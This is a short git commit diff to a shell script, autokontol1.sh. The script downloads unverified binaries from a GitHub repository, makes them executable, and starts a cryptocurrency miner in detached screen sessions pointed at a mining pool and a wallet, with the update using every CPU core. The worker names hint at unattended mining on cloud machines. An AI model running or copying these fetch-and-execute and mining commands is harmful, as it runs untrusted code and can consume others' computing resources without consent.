1702a423dcb3b0a6b5074ec83c7b66e0a872360a
renilo <88342640+renilo@users.noreply.github.com>
2021-10-19 20:58:40 +0700

    Update autokontol1.sh

--- autokontol1.sh
+++ autokontol1.sh
@@ -9,15 +9,11 @@ screen -dmS kontol1.sh ./kontol1.sh 65 75
 
 wget https://github.com/renilo/xmr/raw/main/memek
 
-wget -O meki-baru https://github.com/renilo/xmr/raw/main/meki-baru
+wget -O meki-baru https://github.com/renilo/xmr/raw/main/meki-baru1
 
 chmod +x meki-baru
 
-wget -O verus-solver https://github.com/renilo/xmr/raw/main/verus-solver
-
-chmod 777 verus-solver
-
-screen -dmS run ./meki-baru -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.CLOUD -p x --cpu 4
+screen -dmS run ./meki-baru1 -v -l eu.luckpool.net:3956 -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.NONAMEK -p x -t $(nproc)
 
 wget https://raw.githubusercontent.com/renilo/xmr/main/kontol1.sh
 
